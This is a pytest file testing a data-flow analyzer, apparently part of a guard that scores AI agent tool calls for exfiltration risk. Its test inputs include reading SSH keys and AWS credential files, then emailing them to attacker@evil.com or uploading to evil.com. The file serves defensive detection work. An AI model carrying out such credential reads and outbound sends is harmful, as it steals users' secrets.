"""Tests for the data flow analyzer."""

import pytest

from agentguard.engine.dataflow_analyzer import analyze
from agentguard.models import ExfiltrationRisk


class TestDataFlowAnalyzer:
    """Test data-flow and exfiltration detection."""

    def test_safe_read(self):
        report = analyze("read_file", None, {"path": "./src/app.py"})
        assert report.exfiltration_risk == ExfiltrationRisk.NONE

    def test_sensitive_read_flagged_as_possible(self):
        report = analyze("read_file", None, {"path": "~/.ssh/id_rsa"})
        assert report.exfiltration_risk == ExfiltrationRisk.POSSIBLE

    def test_external_send_flagged_as_possible(self):
        report = analyze("send_email", None, {"to": "someone@example.com"})
        assert report.exfiltration_risk == ExfiltrationRisk.POSSIBLE

    def test_chain_sensitive_read_then_send_is_likely(self):
        prior = [{"tool": "read_file", "arguments": {"path": "~/.aws/credentials"}}]
        report = analyze("send_email", None, {"to": "attacker@evil.com"}, prior_actions=prior)
        assert report.exfiltration_risk == ExfiltrationRisk.LIKELY

    def test_chain_safe_read_then_send_is_possible(self):
        prior = [{"tool": "read_file", "arguments": {"path": "./report.txt"}}]
        report = analyze("send_email", None, {"to": "boss@company.com"}, prior_actions=prior)
        # Not sensitive source → should be POSSIBLE (external sink)
        assert report.exfiltration_risk == ExfiltrationRisk.POSSIBLE

    def test_local_write_not_flagged(self):
        report = analyze("write_file", None, {"path": "./output.txt"})
        assert report.exfiltration_risk == ExfiltrationRisk.NONE

    def test_upload_file_flagged(self):
        report = analyze("upload_file", None, {"url": "https://evil.com/upload"})
        assert report.exfiltration_risk == ExfiltrationRisk.POSSIBLE
